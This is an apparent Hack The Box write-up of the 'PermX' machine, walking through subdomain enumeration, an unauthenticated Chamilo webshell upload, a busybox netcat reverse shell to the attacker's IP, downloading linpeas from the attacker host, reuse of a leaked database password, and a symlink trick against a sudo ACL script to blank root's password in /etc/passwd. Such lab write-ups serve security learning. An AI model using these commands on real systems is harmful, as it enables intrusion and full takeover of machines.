## **Welcome everyone!**



Today, we will explore an **Hack The Box** easy machine: **PermX**. 

Without wasting any more time, let’s start!


![image](/HTB/PermX/PermX_images/1.png)



(ensure that you have added the following line `10.129.37.130   permx.htb` in your local /etc/hosts local file adapting it to your target IP)

## Information Gathering

First, let’s perform an aggressive Nmap scan to gather as much information as possible:



![image](/HTB/PermX/PermX_images/2.png)



We can identify two services running on the target:

**SSH** (OpenSSH 8.9p1 | Port ****22)

**HTTP** (Apache httpd 2.4.52 | 80)

There is a web server running, which is hosting a particular “eLearning” content at its root. That rings a bell, I think I’ve heard it before. Anyways, let’s visit the hosted web site:



![image](/HTB/PermX/PermX_images/3.png)




The root page doesn’t really contain useful information for us to advance, let’s run **Gobuster** in order to discover hidden web directories:



![image](/HTB/PermX/PermX_images/4.png)



We can find common directories that host resources for the web site, nothing much more interesting. Maybe this website is a decoy and is hiding something. Let’s perform some vhost enumeration with **ffuf**:



![image](/HTB/PermX/PermX_images/5.png)



We performed a vhost enumeration using the Host header to discover accessible subdomains like `www` and `lms`. Let’s add them to our `/etc/hosts` file:



![image](/HTB/PermX/PermX_images/6.png)



Once it’s done, we can now try to access **www.permx.htb** or **lms.permx.htb** via our web browser to see what is hosted there. As expected, the first one is a simple copy from the original we know. But let’s check the second one:



![image](/HTB/PermX/PermX_images/7.png)



And we found an hidden login portal powered by Chamilo 1! Let’s search for a potential exploit for this particular framework with **searchsploit**:



![image](/HTB/PermX/PermX_images/8.png)



## Initial Access

We can see that there are multiple exploits, two of them can lead us to achieve a **Remote Code Execution** (RCE) in order to gain a potential initial access on the target. The first one needs to be authenticated, but the second seems not. Let’s verify it by downloading it and running via `python3` with the `-h` switch to get some help about the exploit:



![image](/HTB/PermX/PermX_images/9.png)



We can confirm from there that we do not need to provide any credential! Let’s craft the following webshell in order to upload it to the web server:



![image](/HTB/PermX/PermX_images/10.png)



This script implements a `cmd` parameter in the URL which, when provided, can execute system commands.

We can save it as `webshell.php` and provide it to the python script via `--shell` to upload it:



![image](/HTB/PermX/PermX_images/11.png)



And we uploaded our webshell successfully! 
**Note that we need to be in the same directory as the webshell we are uploading; otherwise, as we can see, its subdirectory specified in the command will also be uploaded, which will cause an error.**

We can now access it via our web browser to the provided URL: 

`http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/YOUR_SHELL?cmd=`

This leads us to execute arbitrary commands on the target!



![image](/HTB/PermX/PermX_images/12.png)



Since we are running command as the web server Linux account (www-data), we can set up a **netcat listener**:

`nc -lvnp 4444`

In parallel, we can obtain initial access on the machine running the following command:

`busybox nc <YOUR_IP> 4444 -e sh`

(In my case i chose to listen on port 4444 but make sure that the port you chose is not busy)



![image](/HTB/PermX/PermX_images/13.png)



We successfully obtained our initial access!

If python3 exists on the machine (which is most likely the case), we can upgrade/stabilize the current shell with the following command:

`python3 -c 'import pty; pty.spawn(”/bin/bash”)'`



![image](/HTB/PermX/PermX_images/14.png)




(After the shell changed, we can additionally run the `export TERM=xterm` command to get back the `clear` utility functional)

We now have a clean command prompt established.

Let’s take a look at the other users present on the system:



![image](/HTB/PermX/PermX_images/15.png)



We can see that the user **mtz** exists, can we access to his `/home` directory?



![image](/HTB/PermX/PermX_images/16.png)



We can’t. 

## Privilege Escalation

We can eventually look at the /var/www/chamilo directory but it contains a huge amount of content:


![image](/HTB/PermX/PermX_images/17.png)




We can use [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), a very well-known tool used to perform local enumeration on a Linux system during the post-exploitation phase. We need to host the binary on our local machine and running the following command in the same directory in order to transfer it to the target:

`python3 -m http.server 8000`

Then, we can download it from the target system into the `/tmp` directory with the following command:

`wget http://YOUR_IP:8000/linpeas.sh`



![image](/HTB/PermX/PermX_images/18.png)



We then give the file execute permission using `chmod +x linpeas` and run it:



![image](/HTB/PermX/PermX_images/19.png)



Although the script returns a lot of data, we can retrieve a database password from the `configuration.php` file:



![image](/HTB/PermX/PermX_images/20.png)



We can try to use it and login as the **mtz** user in the case the password was reused:



![image](/HTB/PermX/PermX_images/21.png)



And it works! We pivoted our access to the user **mtz**. We can now fetch the first flag in the user `/home/mtz` directory:


![image](/HTB/PermX/PermX_images/22.png)




## Privilege Escalation #2

We now need to elevate our privileges in order to retrieve the last flag. We can run `sudo -l` to check whether we can execute commands with elevated privileges:



![image](/HTB/PermX/PermX_images/23.png)



It seems that we can run a particular script with the root permissions without providing any password. This can be dangerous if the script’s permissions are note configured properly. Let’s check this running `ls -la /opt/acl.sh` to list the file’s permissions:



![image](/HTB/PermX/PermX_images/24.png)



It looks like we do not have the write permissions to the file. We can’t write into the `/opt` directory either. We need to operate with the script itself, let’s take a look to it:



![image](/HTB/PermX/PermX_images/25.png)



The script allows us to change the ACL permissions of a file calling the `setfacl` utility which runs the following command:

`sudo setfacl -m u: “$user”:”$perm” “$target”`

To perform this, we need to run the following command:

`sudo /opt/acl.sh mtz rwx /path/to/file`

We can use this script to modify permissions of any file which is in the home directory of user ‘**mtz**’.

If we are able to link any important file in the home directory of mtz, we can change the permission using the `acl.sh` script.

We can run `ln -s /etc/passwd /home/mtz/passwd2` to link the `/etc/passwd` file to a file we can access and alter permissions in the `/home/mtz` directory via the `acl.sh` script:

(We can log in via SSH to get a better shell as we know the password for **mtz** which is `03F6lY3uXAP2bkW8`)



![image](/HTB/PermX/PermX_images/26.png)



From there, we can alter the `passwd2` file’s permission (which is linked to the original `/etc/passwd` file) in order to gain full permissions and remove the root’s password by removing the `x` character from the line. 



![image](/HTB/PermX/PermX_images/27.png)




We can now run nano `/home/mtz/passwd2` to remove the root’s password:



![image](/HTB/PermX/PermX_images/28.png)



Once the `x` removed, Press CTRL+X, then Y to confirm, and Enter to save.

We can now run `su root` in order to gain root access without needing to provide any credential:



![image](/HTB/PermX/PermX_images/28bis.png)



We successfully elevated our privileges! We can now navigate into the `/root` directory and  retrieve the `root.txt` flag:



![image](/HTB/PermX/PermX_images/29.png)



## Conclusion

This machine was interesting to exploit; we performed vhosts enumeration on the target in order to retrieve a vulnerable framework and exploit it to obtain an initial access on the system. We then elevated our access as we recovered a plaintext stored password which allowed us to gain access to a user able to execute a command via sudo. It led us to a total compromise of the system as we were able to modify the `/etc/passwd` file to our convenience. Hence, we could successfully log in as root since we removed the password associated to this account.

Thank you for reading!
